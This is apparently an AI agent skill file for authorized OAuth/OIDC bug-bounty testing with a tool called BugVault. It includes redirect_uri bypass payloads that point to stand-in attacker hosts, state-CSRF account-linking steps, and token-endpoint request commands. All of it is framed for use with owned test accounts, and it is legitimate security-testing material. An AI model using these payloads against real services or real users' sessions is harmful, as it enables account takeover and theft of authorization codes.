---
name: hunt-oauth
description: "OAuth 2.0 / OIDC hunting for authorized BugVault campaigns: redirect_uri validation (host confusion, path traversal, open-redirect chains, parameter pollution, encoding, IDN homographs), state CSRF and account-linking confusion, nonce replay, PKCE enforcement, response_type and response_mode switching, token audience (pass-the-token), skipped verification steps at the token endpoint, Referer leaks on callback pages, mobile deep-link handlers and leaked client secrets. Use for coverage rows of class `oauth` and any /oauth, /connect, /authorize or social-login callback. Proofs only with operator-owned test accounts; exchange a captured code or token before claiming takeover."
license: "MIT; adapted from mind-hunt (Copyright (c) 2026 MindflareX), see LICENSE.txt"
metadata:
  source: "mind-hunt skills/hunt-oauth"
  source-sha256: "cc4e0d809fb85f4be3784fa1f34cd3b24d0c15b204023a6c16c75fcdcaeffd59"
  adapted: "2026-11-11"
---

# Hunt: OAuth 2.0 / OIDC

OAuth flaws lead directly to account takeover, session theft and authentication bypass,
which programs pay most for. Highest-value surfaces: consumer identity-provider
integrations, mobile apps with custom deep-link handlers, multi-tenant SaaS, and
enterprise SSO connectors.

## When this skill applies

- A coverage row of class `oauth`: `recon/score.py` adds it for in-scope paths containing
  oauth, authorize, sso or openid.
- Paths such as `/oauth/authorize`, `/oauth/token`, `/connect/authorize`,
  `/auth/callback`, `/oauth/callback`, `/login?redirect_uri=`, `/signin?next=`.
- An OpenID configuration recorded by the `wellknown` job; social-login buttons;
  JS references to `redirect_uri`, `client_id`, `response_type`, `state`, `nonce`
  (`static-api-mapping`); APK deep-link schemes (`apk-static-mapping`).
- Responses with `Location: https://accounts.…/oauth/…`, `Set-Cookie: oauth_state=` or
  `access_token` in a JSON body.

## Setup

Test accounts **A** and **V** that you own (and, where relevant, your own accounts at the
identity provider, or your own registered OAuth client), HAR imports of A's full login
flow, `"allowed_methods"` including `POST` for token-endpoint tests, every request sent
with `python3 -m recon send`. Use a host you control for redirect targets; BugVault
records an out-of-scope `Location` but never follows it, so the code appears in the
stored response without your host being contacted.

## Methodology

1. **Enumerate entry points** — `/oauth`, `/connect`, `/auth`, `/login` paths in
   `recon.md`; the OpenID configuration; APK manifests and strings (`apk-static-mapping`).
2. **Map the flow** — from A's HAR: `client_id`, `redirect_uri`, `state`, `nonce`,
   `response_type`, where the code or token lands, what validates state and nonce.
3. **`redirect_uri` validation (highest yield)** — send V's authorization request (V's
   session cookie) with each variant below and `--no-follow`. A `Location` carrying V's
   code to a host you control is the primitive.

   ```bash
   python3 -m recon send <campaign> "https://app.example.com/oauth/authorize?client_id=<id>&response_type=code&redirect_uri=https://app.example.com.your-host.example/cb&state=<state>" --header "Cookie: session=<V's session>" --no-follow
   ```

4. **`state` (CSRF)** — remove it; fix it to a constant across sessions; check that it is
   bound to the server session and not only checked in JavaScript.
5. **`nonce`** — replay a nonce from another flow; check it is validated after the token
   exchange and on refresh.
6. **Step completeness** — with your own unverified test account, call the token endpoint
   directly. Tokens for an unverified account bypass the verification step.
7. **Referer leakage** — after a callback carrying a code or token in the URL, list
   on-page third-party resources (images, scripts, iframes, language switchers, analytics)
   that would receive the full URL in `Referer`.
8. **Mobile deep links** — on an emulator you own, send crafted intents to the app's
   webview handler (for example `push_notification_webview?url=`); capture the traffic as
   HAR and import it. Device traffic runs outside BugVault's scoped client.
9. **Client credentials** — a `client_secret` in JS or an APK is a half finding until it
   unlocks something a normal visitor cannot (reportability gate Q3), such as a token
   request with an arbitrary `redirect_uri`.
10. **Verify** — state not validated → CSRF to account linking; code or token on your host
    → session theft only after the code is **exchanged**; skipped verification →
    authentication bypass.

## Payload patterns

`redirect_uri` bypasses (use a host you control in place of `your-host.example`):

```text
# host confusion
https://your-host.example#app.example.com
https://app.example.com.your-host.example
https://app.example.com@your-host.example
# path traversal
https://app.example.com/oauth/callback/../../redirect?url=https://your-host.example
# open redirect on the allowed host
https://app.example.com/logout?next=https://your-host.example
# parameter pollution
?redirect_uri=https://app.example.com/cb&redirect_uri=https://your-host.example/cb
# encoded separators
https://app.example.com%2F@your-host.example
https://app.example.com%252F..%252F..your-host.example
# IDN homograph of the allowed host (punycode)
```

State CSRF: start the flow as A, stop before the callback, and capture A's `code` with a
fixed `state`. Then make **V's** browser profile load
`https://app.example.com/oauth/callback?code=<A's code>&state=<fixed>`. V's account now
linked to A's identity-provider identity is account takeover through linking.

Token endpoint (your own accounts and client only):

```bash
python3 -m recon send <campaign> https://app.example.com/oauth/token --method POST \
  --form grant_type=authorization_code --form code=<captured code> \
  --form client_id=<id> --form redirect_uri=https://app.example.com/callback
python3 -m recon send <campaign> https://app.example.com/oauth/token --method POST \
  --form grant_type=password --form username=<your unverified test account> \
  --form password=<its password> --form client_id=<id>
```

## Common root causes

1. Prefix or domain allow-listing of `redirect_uri` instead of exact match, so an open
   redirect on the same host becomes token theft.
2. Missing `state`, or `state` checked only client-side.
3. `nonce` sent but never verified against the ID token after the exchange.
4. Multi-step sign-up (register → verify → grant) not enforced server-side at the token
   endpoint.
5. Code or token in the callback URL while the page loads third-party resources.
6. Deep-link webviews that load any URL.
7. Wildcard redirect URIs left from development.
8. Confidential client secrets shipped in mobile apps.

## Bypassing defenses

- **Exact-match `redirect_uri`:** find an open redirect on the allowed host and use it as
  the `redirect_uri`.
- **`state` required:** check that it is bound to the session, not only well-formed; check
  whether PKCE is enforced, since `state` alone does not stop code injection.
- **Fragment-only delivery (`response_type=token`):** the fragment never reaches
  `Referer`, but callback-page JavaScript may pass `location.hash` to analytics or
  `postMessage`; review those listeners.
- **Deep-link host validation:** URL encoding, double encoding, Unicode normalization.
- **PKCE:** omit `code_challenge`; if tokens are still issued, PKCE is not enforced (legacy
  or mobile clients are often exempt).
- **Nonce:** validated client-side only, or on the first request but not on refresh.

## Browser parsing vs server parsing

A server-side prefix match passing is necessary but not sufficient. Confirm where the
**browser** actually navigates before calling it a takeover chain.

| Server validator | Attack URL | Server check | Browser host | Exploitable |
|---|---|---|---|---|
| prefix `https://acme.example` (no slash) | `https://acme.example@evil.example/cb` | passes | evil.example (userinfo before the first `/`) | yes |
| prefix `https://acme.example/` | `https://acme.example/@evil.example/cb` | passes | acme.example (`@` is in the path) | no |
| substring `https://acme.example` | `https://acme.example.evil.example/cb` | passes | acme.example.evil.example | yes |
| prefix `https://acme.example/`, `..` normalized | `https://acme.example/../../@evil.example/cb` | passes | acme.example | usually no |
| prefix `https://acme.example/` (Chromium) | `https://acme.example/\@evil.example/cb` | passes | acme.example (`\` becomes `/`) | usually no |

WHATWG URL parsing treats `@` as the userinfo delimiter only before the first `/` after
`://`. Check the final navigation in V's own browser profile (BugVault's synthetic UI
mapping mocks API calls and cannot show this). Server accepts but the browser stays on the
legitimate host: **not** a takeover.

## Proof and gates

Before reporting, the validator's gates apply. In OAuth terms:

1. What can the attacker do now? For example: V clicks a crafted URL → V's code reaches
   your host → you exchange it → you hold a session as V. Without the exchange it is not
   a takeover.
2. What does V lose? At least the authenticated session; more if linked accounts,
   payment methods or private data are reachable.
3. Can it be reproduced from scratch in 10 minutes? Document any timing or victim
   behaviour beyond one click.

`state`-only leakage is low severity. A code or token leak plus a demonstrated exchange is
critical.

```bash
python3 -m recon finding add <campaign> --title "redirect_uri suffix match leaks code to attacker host" --class oauth --url https://app.example.com/oauth/authorize
python3 -m recon fact check <campaign> --response <request_id> --predicate '{"type":"header_present","name":"Location"}'
```

## Reference cases

In BugVault's report index (source-indexed, not reproduced):

| Report | Program | Bug | Indexed bounty |
|---|---|---|---|
| #861940 | Semrush | `redirect_uri` bypass with an IDN homograph | unknown |
| #405100 | Bohemia Interactive | Stealing OAuth tokens via `redirect_uri` | unknown |
| #1861974 | pixiv | Stealing OAuth authorization codes via `redirect_uri` path traversal | $2,000 |
| #2575 | Slack | OAuth2 `redirect_uri` bypass (domain suffix) | unknown |

Public write-ups cited upstream (external, not indexed):

- Booking.com Facebook login: open redirect + `redirect_uri` bypass + `response_type`
  swap (Salt Labs, 2023).
- Expo `expo-auth-session`, CVE-2023-28131: unvalidated `returnUrl` in an OAuth proxy
  (Salt Labs, 2023).
- Microsoft Azure AD "nOAuth": a mutable, unverified `email` claim used as the identifier
  (Descope, 2023).
- Grammarly, Vidio, Bukalapak "pass-the-token": Facebook token `aud`/`app_id` never
  validated (Salt Labs, 2023).
- Zoom: `response_mode=web_message` + lax `postMessage` origin check + cookie tossing
  (2024, reported $15,000 bounty).
- Detectify "dirty dancing": response-type switching and promiscuous `postMessage`
  listeners leaking codes without XSS (2022).

## Hard limits

Only accounts and OAuth clients you own; never phish real users; codes and tokens you
capture belong to your test accounts; stop at the minimum proof of an exchange.

## Related skills

`hunt-ato` (state CSRF through account linking is the textbook takeover) · `hunt-saml`
(SAML-fronted OAuth issuers) · `hunt-auth-bypass` · `service-mapping` (a `takeover-lead`
under an allowed `redirect_uri` parent domain is the highest-impact OAuth chain) ·
`apk-static-mapping` (deep links and client secrets).
